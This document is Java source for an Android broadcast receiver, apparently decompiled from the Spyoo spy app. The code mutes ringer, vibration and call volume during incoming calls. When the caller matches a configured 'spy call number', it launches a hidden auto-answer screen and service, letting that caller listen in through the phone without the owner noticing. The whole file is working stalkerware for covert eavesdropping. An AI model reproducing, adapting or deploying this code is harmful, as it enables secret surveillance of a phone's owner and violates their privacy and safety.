package iits.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Vibrator;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import iits.code.bus.Setting_BUS;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.common.Function;
import iits.mamager.FileManager;
import iits.service.AutoAnswerIntentService;
import iits.spyoo.AutoAnswerScreen;

public class AutoAnswerReceiver extends BroadcastReceiver {
    private static final String TAG = "AutoAnswerReceiver";
    private AudioManager _audioManager;
    private Vibrator _vibrator;

    public void onReceive(Context context, Intent intent) {
        try {
            this._audioManager = (AudioManager) context.getSystemService("audio");
            this._vibrator = (Vibrator) context.getSystemService("vibrator");
            int silent = this._audioManager.getRingerMode();
            int vibrate = this._audioManager.getVibrateSetting(0);
            int volume = this._audioManager.getStreamVolume(2);
            int volumesystem = this._audioManager.getStreamVolume(1);
            this._vibrator.cancel();
            this._audioManager.setStreamVolume(1, 0, 16);
            this._audioManager.setStreamVolume(2, 0, 4);
            this._audioManager.setVibrateSetting(0, 0);
            this._vibrator.cancel();
            Setting_DTO setting = Setting_BUS.get(context);
            String phone_state = intent.getStringExtra("state");
            String number = intent.getStringExtra("incoming_number");
            if (!checkAutoAnswer(context, setting)) {
                this._audioManager.setRingerMode(silent);
                this._audioManager.setVibrateSetting(0, vibrate);
                this._audioManager.setStreamVolume(1, volumesystem, 4);
                this._audioManager.setStreamVolume(2, volume, 4);
            } else if (number != null || !phone_state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                if (phone_state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    Setting_BUS.setSilent(context, silent);
                    Setting_BUS.setVibrate(context, vibrate);
                    if (PhoneNumberUtils.compare(number, setting.getSpyCallNumber())) {
                        Intent i = new Intent(context, AutoAnswerScreen.class);
                        i.setFlags(274726912);
                        context.startActivity(i);
                        context.startService(new Intent(context, AutoAnswerIntentService.class));
                    } else {
                        this._audioManager.setRingerMode(Setting_BUS.getSilent(context));
                        this._audioManager.setVibrateSetting(0, Setting_BUS.getVibrate(context));
                    }
                }
                if (phone_state.equals(TelephonyManager.EXTRA_STATE_IDLE) && !(silent == setting.getSilent() && vibrate == setting.getVibrate())) {
                    this._audioManager.setRingerMode(Setting_BUS.getSilent(context));
                    this._audioManager.setVibrateSetting(0, Setting_BUS.getVibrate(context));
                }
                this._audioManager.setStreamVolume(1, volumesystem, 4);
                this._audioManager.setStreamVolume(2, volume, 4);
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onReceive function: " + e.toString());
        }
    }

    public boolean checkAutoAnswer(Context context, Setting_DTO setting) {
        try {
            if (!Function.isServiceRunning(context, Constants.SERVICE_NAME)) {
                return false;
            }
            if (setting == null) {
                return false;
            }
            if (!setting.getFlagSpyCall()) {
                return false;
            }
            return true;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onReceive function: " + e.toString());
            return false;
        }
    }
}
